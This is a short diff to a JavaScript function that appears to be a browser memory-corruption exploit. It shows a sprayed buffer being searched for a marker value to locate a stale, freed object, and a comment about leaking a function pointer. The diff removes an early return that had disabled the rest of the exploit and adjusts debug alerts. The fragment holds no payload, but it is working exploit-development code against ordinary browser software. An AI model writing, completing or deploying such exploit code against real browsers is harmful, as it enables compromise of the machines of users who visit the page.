@@ -148,7 +148,6 @@ function go_() {
 		//alert("Exploit Failed");
 		document.location.reload();
 	}
-	return;
 	
 	stale[0] += 0x101;
 
@@ -163,7 +162,7 @@ function go_() {
 			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
 			// If this is true then stale[0] points to the same thing as bufs[i][k]
 			if(bufs[i][k] == 0x41414242) {
-				//alert("Found the object!!");
+				alert("Found the object!!");
 
 				// Leak function pointer
 				//stale[0] = fc;
@@ -246,7 +245,6 @@ function go_() {
 			}
 		}
 	}
-	alert("Done2 executing. Did anything happen?")
 	setTimeout(function() {
 		document.location.reload();
 	}, 500);
